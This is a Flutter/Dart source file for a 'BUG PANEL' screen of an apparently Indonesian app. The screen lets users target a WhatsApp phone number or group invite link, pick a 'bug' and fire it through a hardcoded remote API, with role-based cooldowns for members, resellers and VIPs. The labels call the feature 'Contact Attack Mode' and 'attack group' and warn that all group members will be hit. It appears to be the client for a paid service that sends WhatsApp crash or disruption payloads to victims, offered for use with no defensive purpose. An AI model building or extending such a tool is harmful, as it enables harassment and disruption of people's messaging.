import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:http/http.dart' as http;
import 'theme_provider.dart';
import 'cyan_glow_button.dart';

// ─────────────────────────────────────────────────────────────
//  GroupBugPage  –  Bug Contact & Bug Group (UI Revamp)
// ─────────────────────────────────────────────────────────────

class GroupBugPage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final String role;
  final String expiredDate;
  final List<Map<String, dynamic>> listBug;

  const GroupBugPage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.role,
    required this.expiredDate,
    required this.listBug,
  });

  @override
  State<GroupBugPage> createState() => _GroupBugPageState();
}

class _GroupBugPageState extends State<GroupBugPage>
    with TickerProviderStateMixin {
  static const String baseUrl = 'http://arullll.private-rexy.web.id:11235';

  late TabController _tabController;
  late AnimationController _glowCtrl;
  late AnimationController _fadeCtrl;
  late Animation<double> _glowAnim;
  late Animation<double> _fadeAnim;

  final _targetCtrl = TextEditingController();
  final _linkGroupCtrl = TextEditingController();

  String _selectedBugId = '';
  bool _isSending = false;
  int _cooldownSeconds = 0;
  Timer? _cooldownTimer;

  final List<String> _contactLogs = [];
  final List<String> _groupLogs = [];

  @override
  void initState() {
    super.initState();
    _tabController = TabController(length: 2, vsync: this);

    _glowCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1800),
    )..repeat(reverse: true);
    _glowAnim = Tween<double>(begin: 0.3, end: 1.0).animate(_glowCtrl);

    _fadeCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 600),
    )..forward();
    _fadeAnim = CurvedAnimation(parent: _fadeCtrl, curve: Curves.easeIn);

    if (widget.listBug.isNotEmpty) {
      _selectedBugId = widget.listBug[0]['bug_id'];
    }
  }

  @override
  void dispose() {
    _cooldownTimer?.cancel();
    _tabController.dispose();
    _glowCtrl.dispose();
    _fadeCtrl.dispose();
    _targetCtrl.dispose();
    _linkGroupCtrl.dispose();
    super.dispose();
  }

  String? _formatPhone(String raw) {
    String c = raw.replaceAll(RegExp(r'[^\d]'), '');
    if (c.startsWith('0')) c = '62${c.substring(1)}';
    if (c.length < 9 || c.length > 15) return null;
    return c;
  }

  bool _isValidGroupLink(String input) =>
      RegExp(r'https://chat\.whatsapp\.com/[a-zA-Z0-9]{22}').hasMatch(input);

  String _timestamp() {
    final now = DateTime.now();
    return '${now.hour.toString().padLeft(2, '0')}:${now.minute.toString().padLeft(2, '0')}:${now.second.toString().padLeft(2, '0')}';
  }

  void _addLog(List<String> logs, String msg) {
    setState(() {
      logs.insert(0, '[${_timestamp()}] $msg');
      if (logs.length > 30) logs.removeLast();
    });
  }

  void _snack(String msg, {bool error = false}) {
    final theme = AppThemeScope.of(context);
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(msg,
            style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 12)),
        backgroundColor:
            error ? Colors.red.shade900 : theme.accent.withOpacity(0.9),
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        duration: const Duration(seconds: 2),
      ),
    );
  }

  void _startCooldown(int seconds) {
    _cooldownTimer?.cancel();
    setState(() => _cooldownSeconds = seconds);
    _cooldownTimer = Timer.periodic(const Duration(seconds: 1), (t) {
      if (!mounted) { t.cancel(); return; }
      setState(() {
        _cooldownSeconds--;
        if (_cooldownSeconds <= 0) {
          _cooldownSeconds = 0;
          t.cancel();
        }
      });
    });
  }

  Future<void> _sendBasicBug() async {
    if (_isSending || _cooldownSeconds > 0) return;
    final target = _formatPhone(_targetCtrl.text.trim());
    if (target == null) { _snack('❌ Nomor tidak valid', error: true); return; }
    if (_selectedBugId.isEmpty) { _snack('❌ Pilih bug dulu', error: true); return; }

    final bugName = widget.listBug.firstWhere(
      (b) => b['bug_id'] == _selectedBugId,
      orElse: () => {'bug_name': _selectedBugId},
    )['bug_name'];

    HapticFeedback.mediumImpact();
    setState(() => _isSending = true);
    _addLog(_contactLogs, '📤 Mengirim [$bugName] ke $target...');
    try {
      final res = await http.get(Uri.parse(
          'http://arullll.private-rexy.web.id:11235/api/whatsapp/sendBug?key=${widget.sessionKey}&target=$target&bug=$_selectedBugId'));
      final data = jsonDecode(res.body);
      if (data['valid'] == false) {
        _addLog(_contactLogs, '❌ Gagal: ${data['message'] ?? 'Error'}');
        _snack('❌ ${data['message'] ?? 'Gagal'}', error: true);
      } else if (data['cooldown'] == true) {
        final wait = data['wait'] ?? 0;
        _addLog(_contactLogs, '⏳ Cooldown $wait detik');
        _snack('⏳ Cooldown $wait detik', error: true);
        _startCooldown(wait);
      } else {
        _addLog(_contactLogs, '✅ [$bugName] terkirim ke $target');
        _snack('✅ Bug terkirim!');
        _showSuccessSheet(isGroup: false, label: target, data: data);
        final role = data['role'] ?? 'member';
        final cooldownMap = {'member': 300, 'reseller': 240, 'reseller1': 60, 'vip': 60, 'owner': 0};
        final cd = cooldownMap[role] ?? 60;
        if (cd > 0) _startCooldown(cd);
      }
    } catch (_) {
      _addLog(_contactLogs, '❌ Koneksi error');
      _snack('❌ Koneksi error', error: true);
    } finally {
      setState(() => _isSending = false);
    }
  }

  Future<void> _sendGroupBug() async {
    if (_isSending || _cooldownSeconds > 0) return;
    final link = _linkGroupCtrl.text.trim();
    if (!_isValidGroupLink(link)) { _snack('❌ Link grup tidak valid', error: true); return; }

    final bugName = widget.listBug.firstWhere(
      (b) => b['bug_id'] == _selectedBugId,
      orElse: () => {'bug_name': _selectedBugId},
    )['bug_name'];

    HapticFeedback.mediumImpact();
    setState(() => _isSending = true);
    _addLog(_groupLogs, '📤 Menyerang grup dengan [$bugName]...');
    try {
      final res = await http.get(Uri.parse(
          'http://arullll.private-rexy.web.id:11235/api/whatsapp/groupBug?key=${widget.sessionKey}&linkGroup=$link&bug=$_selectedBugId'));
      final data = jsonDecode(res.body);
      if (data['valid'] == false) {
        _addLog(_groupLogs, '❌ Gagal: ${data['message'] ?? 'Error'}');
        _snack('❌ ${data['message'] ?? 'Gagal'}', error: true);
      } else if (data['cooldown'] == true) {
        final wait = data['wait'] ?? 0;
        _addLog(_groupLogs, '⏳ Cooldown $wait detik');
        _snack('⏳ Cooldown $wait detik', error: true);
        _startCooldown(wait);
      } else {
        _addLog(_groupLogs, '✅ [$bugName] berhasil dikirim ke grup');
        _snack('✅ Group Bug terkirim!');
        _showSuccessSheet(isGroup: true, label: link, data: data);
        final role = data['role'] ?? 'member';
        final cooldownMap = {'member': 300, 'reseller': 240, 'reseller1': 60, 'vip': 60, 'owner': 0};
        final cd = cooldownMap[role] ?? 60;
        if (cd > 0) _startCooldown(cd);
      }
    } catch (_) {
      _addLog(_groupLogs, '❌ Koneksi error');
      _snack('❌ Koneksi error', error: true);
    } finally {
      setState(() => _isSending = false);
    }
  }

  void _showSuccessSheet({
    required bool isGroup,
    required String label,
    required Map<String, dynamic> data,
  }) {
    final theme = AppThemeScope.of(context);
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (_) => _SuccessSheet(
        isGroup: isGroup,
        label: label,
        data: data,
        accent: theme.accent,
        bg: theme.bg,
      ),
    );
  }

  // ─────────────────────────────────────────────────────────────
  //  BUILD
  // ─────────────────────────────────────────────────────────────

  @override
  Widget build(BuildContext context) {
    final theme = AppThemeScope.of(context);
    return FadeTransition(
      opacity: _fadeAnim,
      child: Scaffold(
        backgroundColor: theme.bg,
        appBar: _buildAppBar(theme),
        body: Column(
          children: [
            _buildTabBar(theme),
            Expanded(
              child: TabBarView(
                controller: _tabController,
                children: [
                  _buildContactTab(theme),
                  _buildGroupTab(theme),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  PreferredSizeWidget _buildAppBar(ThemeProvider theme) {
    return AppBar(
      backgroundColor: theme.bg,
      elevation: 0,
      leading: IconButton(
        icon: Icon(Icons.arrow_back_ios_new_rounded, color: theme.accent, size: 18),
        onPressed: () => Navigator.pop(context),
      ),
      centerTitle: true,
      title: Column(
        children: [
          AnimatedBuilder(
            animation: _glowAnim,
            builder: (_, __) => Text(
              'BUG PANEL',
              style: TextStyle(
                color: Colors.white,
                fontFamily: 'Orbitron',
                fontSize: 16,
                fontWeight: FontWeight.bold,
                letterSpacing: 3,
                shadows: [
                  Shadow(
                    color: theme.accent.withOpacity(_glowAnim.value * 0.8),
                    blurRadius: 12,
                  ),
                ],
              ),
            ),
          ),
          Text(
            '${widget.username} · ${widget.role.toUpperCase()}',
            style: TextStyle(
              color: theme.accent.withOpacity(0.4),
              fontFamily: 'ShareTechMono',
              fontSize: 9,
              letterSpacing: 1,
            ),
          ),
        ],
      ),
      actions: [
        IconButton(
          icon: Icon(Icons.palette_outlined, color: theme.accent, size: 20),
          tooltip: 'Ganti Tema',
          onPressed: () => ThemePickerSheet.show(context, theme),
        ),
      ],
      bottom: PreferredSize(
        preferredSize: const Size.fromHeight(1),
        child: AnimatedBuilder(
          animation: _glowAnim,
          builder: (_, __) => Container(
            height: 1,
            decoration: BoxDecoration(
              gradient: LinearGradient(colors: [
                Colors.transparent,
                theme.accent.withOpacity(_glowAnim.value * 0.5),
                Colors.transparent,
              ]),
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildTabBar(ThemeProvider theme) {
    return Container(
      margin: const EdgeInsets.fromLTRB(16, 10, 16, 0),
      padding: const EdgeInsets.all(4),
      decoration: BoxDecoration(
        color: theme.card,
        borderRadius: BorderRadius.circular(14),
        border: Border.all(color: theme.accent.withOpacity(0.15)),
      ),
      child: TabBar(
        controller: _tabController,
        indicator: BoxDecoration(
          color: theme.accent.withOpacity(0.15),
          borderRadius: BorderRadius.circular(10),
          border: Border.all(color: theme.accent.withOpacity(0.5)),
        ),
        indicatorSize: TabBarIndicatorSize.tab,
        dividerColor: Colors.transparent,
        labelColor: theme.accent,
        unselectedLabelColor: Colors.white30,
        labelStyle: const TextStyle(fontFamily: 'Orbitron', fontSize: 10, fontWeight: FontWeight.bold),
        unselectedLabelStyle: const TextStyle(fontFamily: 'Orbitron', fontSize: 10),
        tabs: const [
          Tab(icon: Icon(FontAwesomeIcons.addressBook, size: 13), text: 'BUG CONTACT'),
          Tab(icon: Icon(FontAwesomeIcons.userGroup, size: 13), text: 'BUG GROUP'),
        ],
      ),
    );
  }

  Widget _buildContactTab(ThemeProvider theme) {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const SizedBox(height: 6),
          _buildStatsBar(theme,
              icon: FontAwesomeIcons.addressBook,
              label: '${widget.listBug.length} BUG TERSEDIA',
              sub: 'Contact Attack Mode'),
          const SizedBox(height: 16),
          _sectionLabel(theme, 'TARGET NOMOR'),
          const SizedBox(height: 8),
          _inputField(theme, controller: _targetCtrl, hint: '+62xx', icon: FontAwesomeIcons.phone, type: TextInputType.phone),
          const SizedBox(height: 16),
          _sectionLabel(theme, 'PILIH BUG'),
          const SizedBox(height: 8),
          _buildBugSelector(theme),
          const SizedBox(height: 24),
          _buildSendButton(theme, label: 'KIRIM BUG', icon: FontAwesomeIcons.bolt, onTap: _sendBasicBug),
          const SizedBox(height: 20),
          if (_contactLogs.isNotEmpty) _buildLogPanel(theme, _contactLogs),
        ],
      ),
    );
  }

  Widget _buildGroupTab(ThemeProvider theme) {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const SizedBox(height: 6),
          _buildStatsBar(theme,
              icon: FontAwesomeIcons.userGroup,
              label: 'GROUP ATTACK MODE',
              sub: 'Semua member grup akan kena'),
          const SizedBox(height: 16),
          _sectionLabel(theme, 'LINK GRUP WHATSAPP'),
          const SizedBox(height: 8),
          _inputField(theme, controller: _linkGroupCtrl, hint: 'https://chat.whatsapp.com/...', icon: FontAwesomeIcons.link, type: TextInputType.url),
          const SizedBox(height: 6),
          Row(children: [
            Icon(FontAwesomeIcons.circleInfo, color: theme.accent.withOpacity(0.35), size: 11),
            const SizedBox(width: 6),
            Text('Format: https://chat.whatsapp.com/XXXXXXXXXXXXXXXXXXXXXX',
                style: TextStyle(color: theme.accent.withOpacity(0.35), fontFamily: 'ShareTechMono', fontSize: 10)),
          ]),
          const SizedBox(height: 20),
          _buildWarningBox(),
          const SizedBox(height: 20),
          _buildSendButton(theme, label: 'SERANG GRUP', icon: FontAwesomeIcons.userGroup, onTap: _sendGroupBug),
          const SizedBox(height: 20),
          if (_groupLogs.isNotEmpty) _buildLogPanel(theme, _groupLogs),
        ],
      ),
    );
  }

  // ── Shared widgets ─────────────────────────────────────────────

  Widget _buildStatsBar(ThemeProvider theme, {required IconData icon, required String label, required String sub}) {
    return AnimatedBuilder(
      animation: _glowAnim,
      builder: (_, __) => Container(
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
        decoration: BoxDecoration(
          color: theme.card,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: theme.accent.withOpacity(0.2 + _glowAnim.value * 0.1)),
          boxShadow: [BoxShadow(color: theme.accent.withOpacity(_glowAnim.value * 0.07), blurRadius: 16)],
        ),
        child: Row(children: [
          Container(
            padding: const EdgeInsets.all(10),
            decoration: BoxDecoration(color: theme.accent.withOpacity(0.12), borderRadius: BorderRadius.circular(10)),
            child: Icon(icon, color: theme.accent, size: 16),
          ),
          const SizedBox(width: 12),
          Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            Text(label, style: TextStyle(color: theme.accent, fontFamily: 'Orbitron', fontSize: 11, fontWeight: FontWeight.bold, letterSpacing: 1)),
            Text(sub, style: const TextStyle(color: Colors.white38, fontFamily: 'ShareTechMono', fontSize: 10)),
          ]),
          const Spacer(),
          Container(width: 8, height: 8, decoration: BoxDecoration(
            color: theme.accent, shape: BoxShape.circle,
            boxShadow: [BoxShadow(color: theme.accent.withOpacity(0.7), blurRadius: 6)],
          )),
        ]),
      ),
    );
  }

  Widget _sectionLabel(ThemeProvider theme, String text) => Padding(
    padding: const EdgeInsets.only(bottom: 0),
    child: Text(text, style: TextStyle(color: theme.accent.withOpacity(0.5), fontFamily: 'Orbitron', fontSize: 9, letterSpacing: 2)),
  );

  Widget _inputField(ThemeProvider theme, {required TextEditingController controller, required String hint, required IconData icon, TextInputType type = TextInputType.text}) {
    return Container(
      decoration: BoxDecoration(color: theme.card, borderRadius: BorderRadius.circular(12), border: Border.all(color: theme.accent.withOpacity(0.2))),
      child: TextField(
        controller: controller,
        keyboardType: type,
        style: const TextStyle(color: Colors.white, fontFamily: 'ShareTechMono', fontSize: 14),
        decoration: InputDecoration(
          hintText: hint,
          hintStyle: const TextStyle(color: Colors.white24, fontFamily: 'ShareTechMono'),
          prefixIcon: Icon(icon, color: theme.accent.withOpacity(0.5), size: 15),
          border: InputBorder.none,
          contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
        ),
      ),
    );
  }

  Widget _buildBugSelector(ThemeProvider theme) {
    if (widget.listBug.isEmpty) {
      return Container(
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(color: theme.card, borderRadius: BorderRadius.circular(12), border: Border.all(color: theme.accent.withOpacity(0.1))),
        child: const Row(children: [
          Icon(FontAwesomeIcons.triangleExclamation, color: Colors.orange, size: 13),
          SizedBox(width: 8),
          Text('Tidak ada bug tersedia', style: TextStyle(color: Colors.white30, fontFamily: 'ShareTechMono')),
        ]),
      );
    }
    return Column(
      children: widget.listBug.map((bug) {
        final isSelected = _selectedBugId == bug['bug_id'];
        return GestureDetector(
          onTap: () => setState(() => _selectedBugId = bug['bug_id']),
          child: AnimatedContainer(
            duration: const Duration(milliseconds: 180),
            margin: const EdgeInsets.only(bottom: 8),
            padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 11),
            decoration: BoxDecoration(
              color: isSelected ? theme.accent.withOpacity(0.12) : theme.card,
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: isSelected ? theme.accent.withOpacity(0.6) : theme.accent.withOpacity(0.1)),
              boxShadow: isSelected ? [BoxShadow(color: theme.accent.withOpacity(0.2), blurRadius: 10)] : null,
            ),
            child: Row(children: [
              Icon(isSelected ? FontAwesomeIcons.circleCheck : FontAwesomeIcons.circle,
                  color: isSelected ? theme.accent : Colors.white24, size: 14),
              const SizedBox(width: 12),
              Expanded(child: Text(bug['bug_name'] ?? bug['bug_id'],
                  style: TextStyle(color: isSelected ? theme.accent : Colors.white70, fontFamily: 'ShareTechMono', fontSize: 13))),
              if (isSelected)
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                  decoration: BoxDecoration(color: theme.accent.withOpacity(0.15), borderRadius: BorderRadius.circular(6)),
                  child: Text('AKTIF', style: TextStyle(color: theme.accent, fontFamily: 'Orbitron', fontSize: 8, letterSpacing: 1)),
                ),
            ]),
          ),
        );
      }).toList(),
    );
  }

  Widget _buildSendButton(ThemeProvider theme, {required String label, required IconData icon, required VoidCallback onTap}) {
    final bool onCooldown = _cooldownSeconds > 0;
    return CyanGlowButtonCooldown(
      label: label,
      icon: icon,
      onPressed: onTap,
      isCooldown: onCooldown,
      cooldownSeconds: _cooldownSeconds,
      isLoading: _isSending,
      glowColor: theme.accent,
    );
  }

  Widget _buildWarningBox() {
    return Container(
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: const Color(0x0FFF9800),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: const Color(0x33FF9800)),
      ),
      child: const Row(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Icon(FontAwesomeIcons.triangleExclamation, color: Colors.orange, size: 13),
        SizedBox(width: 10),
        Expanded(child: Text(
          'Hanya tersedia untuk role yang memiliki akses Group Bug. Pastikan link grup valid sebelum menyerang.',
          style: TextStyle(color: Colors.orange, fontFamily: 'ShareTechMono', fontSize: 11),
        )),
      ]),
    );
  }

  Widget _buildLogPanel(ThemeProvider theme, List<String> logs) {
    return Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      Row(children: [
        Icon(FontAwesomeIcons.terminal, color: theme.accent.withOpacity(0.5), size: 11),
        const SizedBox(width: 6),
        Text('ACTIVITY LOG', style: TextStyle(color: theme.accent.withOpacity(0.5), fontFamily: 'Orbitron', fontSize: 9, letterSpacing: 2)),
        const Spacer(),
        GestureDetector(
          onTap: () => setState(() => logs.clear()),
          child: const Text('CLEAR', style: TextStyle(color: Colors.white24, fontFamily: 'Orbitron', fontSize: 8, letterSpacing: 1)),
        ),
      ]),
      const SizedBox(height: 8),
      Container(
        height: 120,
        decoration: BoxDecoration(color: theme.card, borderRadius: BorderRadius.circular(12), border: Border.all(color: theme.accent.withOpacity(0.1))),
        child: ListView.builder(
          padding: const EdgeInsets.all(10),
          itemCount: logs.length,
          itemBuilder: (_, i) => Text(logs[i], style: TextStyle(
            color: logs[i].contains('✅') ? theme.accent.withOpacity(0.8)
                : logs[i].contains('❌') ? const Color(0xCCFFFFFF)
                : Colors.white38,
            fontFamily: 'ShareTechMono', fontSize: 10, height: 1.6,
          )),
        ),
      ),
    ]);
  }
}

// ─────────────────────────────────────────────────────────────
//  Success Bottom Sheet
// ─────────────────────────────────────────────────────────────

class _SuccessSheet extends StatelessWidget {
  final bool isGroup;
  final String label;
  final Map<String, dynamic> data;
  final Color accent;
  final Color bg;

  const _SuccessSheet({
    required this.isGroup,
    required this.label,
    required this.data,
    required this.accent,
    required this.bg,
  });

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.fromLTRB(24, 16, 24, 36),
      decoration: BoxDecoration(
        color: bg,
        borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
        border: Border(top: BorderSide(color: accent.withOpacity(0.3))),
        boxShadow: [BoxShadow(color: accent.withOpacity(0.15), blurRadius: 30, offset: const Offset(0, -5))],
      ),
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          Container(width: 36, height: 4, decoration: BoxDecoration(color: accent.withOpacity(0.3), borderRadius: BorderRadius.circular(2))),
          const SizedBox(height: 24),
          Container(
            padding: const EdgeInsets.all(20),
            decoration: BoxDecoration(
              color: accent.withOpacity(0.1),
              shape: BoxShape.circle,
              border: Border.all(color: accent.withOpacity(0.4)),
              boxShadow: [BoxShadow(color: accent.withOpacity(0.3), blurRadius: 20)],
            ),
            child: Icon(isGroup ? FontAwesomeIcons.userGroup : FontAwesomeIcons.checkDouble, color: accent, size: 28),
          ),
          const SizedBox(height: 16),
          Text(isGroup ? 'GROUP BUG SENT!' : 'BUG SENT!',
              style: TextStyle(color: accent, fontFamily: 'Orbitron', fontSize: 18, fontWeight: FontWeight.bold, letterSpacing: 2)),
          const SizedBox(height: 4),
          Text(label, style: const TextStyle(color: Colors.white38, fontFamily: 'ShareTechMono', fontSize: 11),
              textAlign: TextAlign.center, maxLines: 2, overflow: TextOverflow.ellipsis),
          const SizedBox(height: 16),
          Divider(color: accent.withOpacity(0.1)),
          const SizedBox(height: 12),
          if (isGroup) ...[
            _row('Status', data['success'] == true ? '✅ Berhasil' : '❌ Gagal', accent),
            if (data['canSendMessage'] != null)
              _row('Can Send Msg', data['canSendMessage'] == true ? 'Ya' : 'Tidak', accent),
            if (data['groupInfo'] != null) ...[
              _row('Nama Grup', data['groupInfo']['subject'] ?? 'Unknown', accent),
              _row('Members', data['groupInfo']['participants']?.toString() ?? '?', accent),
            ],
          ] else ...[
            _row('Target', label, accent),
            if (data['message'] != null) _row('Status', data['message'].toString(), accent),
          ],
          const SizedBox(height: 20),
          SizedBox(
            width: double.infinity,
            child: ElevatedButton(
              onPressed: () => Navigator.pop(context),
              style: ElevatedButton.styleFrom(
                backgroundColor: accent,
                foregroundColor: bg,
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                padding: const EdgeInsets.symmetric(vertical: 14),
                elevation: 0,
              ),
              child: const Text('DONE', style: TextStyle(fontFamily: 'Orbitron', fontWeight: FontWeight.bold, letterSpacing: 1.5)),
            ),
          ),
        ],
      ),
    );
  }

  Widget _row(String lbl, String value, Color accent) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 10),
      child: Row(children: [
        SizedBox(width: 110, child: Text('$lbl:', style: const TextStyle(color: Colors.white38, fontFamily: 'ShareTechMono', fontSize: 12))),
        Expanded(child: Text(value, style: TextStyle(color: accent, fontFamily: 'ShareTechMono', fontSize: 12))),
      ]),
    );
  }
}
